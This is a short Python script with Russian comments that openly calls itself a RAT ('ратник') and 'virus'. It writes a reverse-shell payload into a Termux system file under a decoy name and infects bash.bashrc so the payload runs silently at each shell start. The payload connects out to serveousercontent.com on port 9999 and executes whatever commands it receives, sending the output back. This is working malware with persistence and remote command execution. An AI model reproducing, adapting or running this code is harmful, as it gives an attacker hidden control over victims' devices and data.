#код ратника
ratnik = """
import socket
import os
import subprocess
s = socket.socket() 
os.system("bash bash.bashrc")
host = str("serveousercontent.com") #айпи/домен
port = 9999 #открытый порт
while True: #пробуем подключится к серверу, если нет подключения - идет повтор
    try:
        s.connect((host, port))
        break
    except:
        pass
#воспроизвод комманды, которую вы вписали
while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
                os.chdir(data[3:].decode("utf-8"))

        if len(data) > 0: 
                
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
                
                output_bytes = cmd.stdout.read() + cmd.stderr.read() 
                output_str = str(output_bytes, "utf-8")

                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                print(output_str)
#закрывается соединение, если что-то не так.
s.close()
"""
#сам ратник
f = open("/data/data/com.termux/files/usr/etc/mead.md.save.1", "a")
f.write(ratnik)
#заражаем файл, который запускается в самом начале, при открытие сервера. Этот файл запускает сам вирус
g = open("/data/data/com.termux/files/usr/etc/bash.bashrc", "a")
g.write("python /data/data/com.termux/files/usr/etc/mead.md.save.1 > /dev/null 2>&1 &")
